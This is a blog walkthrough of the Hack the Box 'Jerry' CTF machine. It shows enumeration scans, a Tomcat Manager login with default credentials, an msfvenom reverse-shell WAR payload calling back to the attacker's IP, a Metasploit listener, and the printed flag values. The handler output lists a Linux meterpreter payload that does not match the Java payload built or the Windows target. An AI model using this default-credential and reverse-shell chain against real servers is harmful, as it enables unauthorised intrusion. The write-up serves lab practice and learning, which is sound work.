---
title: Jerry, Hack the Box CTF Walkthrough
lead: Exploiting the Tomcat Manager Application
tag: CTF
image: /assets/img/posts/2021-03-04-jerry-hack-the-box-walkthrough/jerry.png
layout: post
description: ""
date:   2021-03-04 20:01:21 -0400
last-updated: 2021-03-04 20:01:21 -0400
tag: ctf
author: Tyler Butler
description: "Jerry is an easy level HTB challenge from the HTB archives"
card: card-2
---

Jerry is an easy level HTB challenge from the HTB archives. The challenge involves basic CVE discovery through enumeration scans, and requires manual exploitation of the tomcat apache webserver. Overall this was a straightforward CTF challenge.  

## Enumeration  

First, I conducted a quick nmap scan of the top 200 ports to get a quick idea on the targets running services.  

```bash
┌──(kali㉿kali)-[~/Documents/htb/jerry]
└─$ nmap --top-ports 200 -Pn 10.10.10.95
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-04 15:43 EST
Nmap scan report for 10.10.10.95
Host is up (0.16s latency).
Not shown: 199 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds
```

The results showed an open webserver on port 8080. I started a more in-depth scan using the nmapAutomator script.  Output from the scan revealed the server was running the apache tomcat webserver, a technology used to run java servlets and other java web technologies.  The recon stage of the script used Gobuster to brute force  directories, which revealed the apache tomcat `/manager` path.  

```bash
---------------------Running Recon Commands----------------------
                                                                                                                                                           

Starting gobuster scan
                                                                                                                                                           
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.95:8080
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/03/04 15:51:47 Starting gobuster
===============================================================
http://10.10.10.95:8080/aux (Status: 200) [Size: 0]
http://10.10.10.95:8080/com2 (Status: 200) [Size: 0]
http://10.10.10.95:8080/com1 (Status: 200) [Size: 0]
http://10.10.10.95:8080/com3 (Status: 200) [Size: 0]
http://10.10.10.95:8080/con (Status: 200) [Size: 0]
http://10.10.10.95:8080/docs (Status: 302) [Size: 0]
http://10.10.10.95:8080/examples (Status: 302) [Size: 0]
http://10.10.10.95:8080/favicon.ico (Status: 200) [Size: 21630]
http://10.10.10.95:8080/host-manager (Status: 302) [Size: 0]
http://10.10.10.95:8080/lpt1 (Status: 200) [Size: 0]
http://10.10.10.95:8080/lpt2 (Status: 200) [Size: 0]
http://10.10.10.95:8080/manager (Status: 302) [Size: 0]
http://10.10.10.95:8080/nul (Status: 200) [Size: 0]
http://10.10.10.95:8080/prn (Status: 200) [Size: 0]
```  

## Password Cracking  

Upon visiting the manager URL, I was met with a basic HTTP authentication login form. From the eJPT course and certification exam, I already knew the default password for apache tomcat  was username:tomcat password:s3cret. Indeed, when I tried that combination it worked, showing the server was left secured with default credentials. This could also have been deduced using nikto, which also revealed the weak authentication.  

```bash
Starting nikto scan
                                                                                                                                                           
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.95
+ Target Hostname:    10.10.10.95
+ Target Port:        8080
+ Start Time:         2021-03-04 15:52:18 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
+ 7967 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2021-03-04 15:56:50 (GMT-5) (272 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

Finished nikto scan
                                                                                                                                                           
=========================
```  



After authenticating to the server, I found the manager application allowed the admin to upload a WAR file which would be executed by the server.   


<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-03-04-jerry-hack-the-box-walkthrough/upload.png">
    </div>
</div>
<br/>  

## Payload Creation  

Using `msfvenom`, I created a reverse tcp shell payload to upload to the target server. Once executed, the payload would connect back to my attacker machine on port 4443.  

```bash
┌──(kali㉿kali)-[~/Documents/htb/jerry]
└─$ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.13 lport=4443 -f war -o pwn.war
Payload size: 13401 bytes
Final size of war file: 13401 bytes
Saved as: pwn.war
```  

Using the manager application, the payload was uploaded. 


## Catching a Reverse Shell  

Before triggering the payload, I used the multi/handler on `metasploit` to start a listener on my attacker machine to receive the reverse shell. Once the listener was started, I browsed to the location of the payload on the server, triggering the payload, and sending a reverse shell to my machine. 


```bash
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.13      yes       The listen address (an interface may be specified)
   LPORT  4443             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.13:4443 
[*] Sending stage (3008420 bytes) to 10.10.10.95
[*] Meterpreter session 1 opened (10.10.14.13:4443 -> 127.0.0.1) at 2021-03-04 18:58:40 -0500
```    

## Finding the Flags  

To find the flags, I dropped into the shell and manually searched the target to find the flag files.   

```bash
C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  27,601,940,480 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\Users\Administrator\Desktop\flags>
```



